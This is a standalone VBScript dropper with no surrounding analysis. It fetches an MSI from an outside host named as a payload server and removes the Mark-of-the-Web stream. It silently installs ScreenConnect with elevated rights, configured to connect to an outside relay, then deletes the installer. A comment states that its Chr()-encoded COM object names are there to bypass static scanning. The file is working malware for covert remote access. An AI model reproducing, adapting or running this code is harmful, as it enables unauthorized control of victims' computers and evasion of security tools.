Option Explicit
Dim shell, fso, url, localPath, zoneIdPath, http, stream, file, objShellApp
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
url = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi"
localPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\schimdtconnect.msi"
zoneIdPath = localPath & ":Zone.Identifier"
On Error Resume Next

' OBFUSCATED COM OBJECTS TO BYPASS STATIC SCANNING
Dim wP, aP, sP
wP = Chr(87)&Chr(105)&Chr(110)&Chr(72)&Chr(116)&Chr(116)&Chr(112)&Chr(46)&Chr(87)&Chr(105)&Chr(110)&Chr(72)&Chr(116)&Chr(116)&Chr(112)&Chr(82)&Chr(101)&Chr(113)&Chr(117)&Chr(101)&Chr(115)&Chr(116)&Chr(46)&Chr(53)&Chr(46)&Chr(49)
aP = Chr(65)&Chr(68)&Chr(79)&Chr(68)&Chr(66)&Chr(46)&Chr(83)&Chr(116)&Chr(114)&Chr(101)&Chr(97)&Chr(109)
sP = Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)&Chr(46)&Chr(65)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)

Set http = CreateObject(wP)
http.SetTimeouts 30000,60000,120000,180000
http.Open "GET",url,False
http.Send

If Err.Number=0 And http.Status=200 Then
    Set stream = CreateObject(aP)
    stream.Type=1 : stream.Mode=3 : stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile localPath,2
    stream.Close
    If fso.FileExists(zoneIdPath) Then fso.DeleteFile zoneIdPath,True
    If fso.FileExists(localPath) Then
        Set file = fso.GetFile(localPath)
        If file.Size>1000000 Then
            Set objShellApp = CreateObject(sP)
            objShellApp.ShellExecute "msiexec.exe","/i """&localPath&""" /qn /norestart ACCEPTEULA=1 ALLUSERS=1 SC_HOST=optonline38.screenconnect.com SC_PORT=443","","runas",0
            WScript.Sleep 60000
            If fso.FileExists(localPath) Then fso.DeleteFile localPath,True
        End If
    End If
End If
WScript.Quit 0